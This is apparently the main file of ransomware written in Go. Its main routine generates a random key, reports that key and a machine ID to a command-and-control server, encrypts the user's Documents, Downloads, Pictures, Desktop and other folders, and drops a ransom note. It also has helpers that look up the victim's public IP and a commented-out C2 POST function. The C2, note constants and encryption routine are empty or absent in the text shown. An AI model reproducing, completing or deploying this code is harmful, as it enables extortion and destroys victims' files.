package main

import (
	"encoding/base64"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/user"
	"time"

	"github.com/denisbrodbeck/machineid"
)

const (
	README string = ""
	C2     string = ""
	NOTE   string = ""
)

var (
	TGT_DIRS = []string{"Documents", "Downloads", "Music", "Pictures", "Videos", "Desktop"}
)

func main() {
	//move_to_home()
	os.Chdir("..")
	// generate the encryption key
	k := RandStringRunes(32)
	mid = generate_id()
	log.Printf("Key: %s\nID: %s", k, mid)
	Report(k, mid)

	// Encrypt the directories now :)
	key := []byte(k)
	for _, dir := range TGT_DIRS {
		Encrypt_dir(dir, key)
	}

	// Drop the Ransom Note
	f, _ := os.Create(README)
	f.WriteString(from_b64(NOTE) + " " + mid)
	f.Close()
}

func generate_key(num int) string {
	key := make([]byte, num)
	pool := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	for i := range key {
		rand.Seed(time.Now().UnixNano())
		key[i] = pool[rand.Intn(len(pool))]
	}
	return string(key)
}

var mid string

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandStringRunes(n int) string {
	rand.Seed(time.Now().UnixNano())
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func randomSelectStr(list []string) string {
	rand.Seed(time.Now().UnixNano())
	return list[rand.Intn(len(list))]
}
func ggip() string {
	ip := ""
	resolvers := []string{
		"https://api.ipify.org?format=text",
		"http://api.ipify.org",
		"http://api.ipify.org?format=text",
		"https://api.ipify.org",
	}

	for {
		url := randomSelectStr(resolvers)
		resp, err := http.Get(url)
		if err != nil {
			log.Printf("%v\n", err)
		}
		defer resp.Body.Close()

		i, _ := ioutil.ReadAll(resp.Body)
		ip = string(i)

		if resp.StatusCode == 200 {
			break
		}
	}

	return ip
}

// unique identifier for the particular machine
func generate_id() string {
	id, err := machineid.ID()
	if err != nil {
		log.Println(err)
	}
	return id
}
func getUser() (string, error) {
	current_user, err := user.Current()
	return current_user.Username, err
}

// report details to C2

// func post(posturl string) {
// 	r, err := http.NewRequest("POST", posturl, nil)
// 	if err != nil {
// 		log.Println("LINE 110: " + err.Error())
// 	}
// 	client := &http.Client{}
// 	res, err := client.Do(r)
// 	if err != nil {
// 		log.Println("LINE 118: " + err.Error())
// 	}

// 	defer res.Body.Close()
// 	// post := &Post{}
// 	// derr := json.NewDecoder(res.Body).Decode(post)
// 	// if derr != nil {
// 	// 	log.Println("LINE 126: " + derr.Error())
// 	// }
// 	//log.Println(post.Data)
// }

// return base64 encoding of str
func to_b64(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

// decode a base64 string
func from_b64(str string) string {
	res, _ := base64.RawURLEncoding.DecodeString(str)
	return string(res)
}

// change to user's home directory
func move_to_home() {
	homedir, _ := os.UserHomeDir()
	os.Chdir(homedir)
}

// check whether the system is online
func is_online() bool {
	_, err := http.Get("https://www.google.com")
	return err == nil
}

// read the file and return its content
func read_file(file string) []byte {
	content, _ := os.ReadFile(file)
	return content
}
